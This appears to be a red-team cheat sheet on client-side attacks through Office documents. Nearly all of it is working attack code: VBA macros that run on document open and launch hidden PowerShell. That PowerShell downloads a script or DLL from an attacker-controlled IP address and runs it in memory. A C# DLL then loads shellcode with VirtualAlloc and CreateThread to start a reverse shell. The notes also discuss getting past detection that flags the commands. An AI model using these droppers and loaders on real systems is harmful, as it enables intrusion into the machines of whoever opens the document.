# Reflective Code Execution in Client Side Attacks

### Microsoft Word/Excel use VBA

*** Flagged cause of Powershell command.  Basic VBA dropper ***


### This is reflective poewrshell.  This should download ps1 and run it in memory but this gets flagged.  

``` VBA

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.50.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


######################### OR ############################################ 


Sub MyMacro()
    Dim str As String
    str = "powershell.exe $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.196:4443/DLL_process_hollow.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType('ReflectiveDLLCSharp.Class1'); $method = $class.GetMethod('runner');$method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

<br><br><br><br><br>

### Reflective exection with DLL.  Make C# DLL, copy main 

*** copy DLL code into runner function below ***  
Steps: 

1) Make DLL below with shell code and host on Kali/attacker controlled location
2) Add powershell to whatever you need to load assembly and class etc

``` powershell

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)

```




``` Csharp

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ReflectiveDLLCSharp
{
    public class Class1
    {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
             uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
              IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

            public static void runner()
            {

            //Shellcode
            byte[] buf = new byte[1] { 0xAA };


            int size = buf.Length;

            //allocate memory
            var virtaddr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // copy revshell into memory
            System.Runtime.InteropServices.Marshal.Copy(buf, 0, virtaddr, (int)size);


            //create thread and start process
            var thandle = CreateThread(IntPtr.Zero, 0, virtaddr,
                IntPtr.Zero, 0, IntPtr.Zero);


            //waits for the shell to end so the revshell doesnt get closed early
            WaitForSingleObject(thandle, 0xFFFFFFFF);


        }
    }
}   

```
